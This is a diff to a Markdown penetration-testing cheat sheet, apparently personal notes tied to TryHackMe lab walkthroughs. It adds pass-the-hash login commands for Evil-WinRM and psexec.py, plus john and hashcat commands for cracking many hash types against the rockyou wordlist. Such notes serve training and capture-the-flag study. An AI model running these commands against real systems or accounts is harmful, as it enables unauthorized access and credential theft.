+### Evil-WinRM
+
+**Example**
+
+[red-team-capstone-challenge.md](../../walkthroughs/tryhackme/red-team-capstone-challenge.md "mention")
+
+**Kali**
+
+```
+evil-winrm -u $USERNAME -H $HASH -i $VICTIM
+```
+
+### PSexec
+
+**Example**
+
+[red-team-capstone-challenge.md](../../walkthroughs/tryhackme/red-team-capstone-challenge.md "mention")
+
+**Kali**
+
+```
+/usr/local/bin/psexec.py $USERNAME@$VICTIM -hashes $HASH:$HASH
+```
+
+
 
 ## Hashes
+
+First identify the hash with one of the HASH analyzers.
+
+### Crack MD4 hash
+
+#### Examples
+
+[crack-the-hash.md](../../walkthroughs/tryhackme/crack-the-hash.md "mention")
+
+**Kali**
+
+```
+john --format=raw-md4 hash.txt --wordlist=password
+```
 
 ### Crack MD5 hash
 
@@ -481,7 +1227,7 @@ john --format=raw-md5 hash.txt
 
 #### Examples
 
-[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")
+[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[crack-the-hash.md](../../walkthroughs/tryhackme/crack-the-hash.md "mention")
 
 **Kali**
 
@@ -489,11 +1235,24 @@ john --format=raw-md5 hash.txt
 john --format=raw-sha1 hash.txt
 ```
 
+### Crack HMAC-SHA1 hash
+
+#### Examples
+
+[crack-the-hash.md](../../walkthroughs/tryhackme/crack-the-hash.md "mention")
+
+**Kali**
+
+```
+hashcat -m 160 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 160 hash.txt --show
+```
+
 ### Crack SHA-256
 
 #### Examples
 
-[game-zone.md](../../walkthroughs/tryhackme/game-zone.md "mention") [john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")
+[game-zone.md](../../walkthroughs/tryhackme/game-zone.md "mention") [john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[crack-the-hash.md](../../walkthroughs/tryhackme/crack-the-hash.md "mention")
 
 **Kali**
 
@@ -506,8 +1265,6 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
 #### Examples
 
 [overpass-2-hacked.md](../../walkthroughs/tryhackme/overpass-2-hacked.md "mention")[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[linux-privesc.md](../../walkthroughs/tryhackme/linux-privesc.md "mention")
-
-
 
 **Kali**
 
@@ -522,19 +1279,51 @@ hashcat -m 1710 -w /usr/share/wordlists/rockyou.txt hash.txt
 hashcat -m 1710 hash.txt --show
 ```
 
+### Crack SHA-512 crypt
+
+**Examples**
+
+[crack-the-hash.md](../../walkthroughs/tryhackme/crack-the-hash.md "mention")
+
+**Salt:** aReallyHardSalt
+
+<figure><img src="../../.gitbook/assets/image (6) (3) (2).png" alt=""><figcaption></figcaption></figure>
+
+**hash.txt**&#x20;
+
+The hash is already in the hash so didn't change anything.
+
+<figure><img src="../../.gitbook/assets/image (134) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+<pre><code><strong>john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</strong></code></pre>
+
+Using hashcat
+
+**Examples**
+
+[the-cod-caper.md](../../walkthroughs/tryhackme/the-cod-caper.md "mention")
+
+**Kali**
+
+```
+hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt
+hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt --show
+```
+
 ### Crack BCrypt
 
 #### Examples
 
-[daily-bugle.md](../../walkthroughs/tryhackme/daily-bugle.md "mention")
+[daily-bugle.md](../../walkthroughs/tryhackme/daily-bugle.md "mention") [crack-the-hash.md](../../walkthroughs/tryhackme/crack-the-hash.md "mention")
 
 **Kali**
 
 ```
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 ```
-
-
 
 ### Crack Whirlpool
 
@@ -547,8 +1336,6 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 ```
 john --format=whirlpool hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 ```
-
-
 
 ### Crack NT hash
 
@@ -621,6 +1408,33 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt --show
 hashcat -m 18200 hash.txt Pass.txt
 hashcat -m 18200 hash.txt Pass.txt --show
 ```
+
+### Crack Apache Hash
+
+#### Examples
+
+[cyborg.md](../../walkthroughs/tryhackme/cyborg.md "mention")
+
+**Kali**
+
+```
+hashcat -m 1600 password /usr/share/wordlists/rockyou.txt
+hashcat -m 1600 password --show
+```
+
+### Crack GOST R 34.11-94
+
+#### Examples
+
+[easy-peasy.md](../../walkthroughs/tryhackme/easy-peasy.md "mention")
+
+**Kali**
+
+```
+john --wordlist=easypeasy.txt --format=GOST hash.txt
+```
+
+
 
 
 
